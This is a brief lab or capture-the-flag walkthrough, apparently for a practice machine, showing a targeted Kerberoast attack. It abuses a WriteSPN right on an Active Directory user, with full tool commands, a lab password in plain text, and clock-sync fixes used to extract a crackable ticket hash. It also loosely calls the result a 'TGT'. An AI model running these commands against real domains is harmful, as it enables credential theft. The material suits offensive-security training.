
This ACL allows us to perform an targetedKerberoast Attack. We can give an object an SPN and then get his TGT doing so.

---

In this scenario our current user "henry" has **WriteSPN** over user "alfred".

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-host dc01.tombwatcher.htb
```

We got an Clock Skew Error, let's fix this real quick.

```
sudo timedatectl set-ntp off 
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u 10.129.76.222
```

Rerun the command and retrieved the TGT Hash.

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -f hashcat --dc-host dc01.tombwatcher.htb
```

Retrieved the TGT of user "alfred".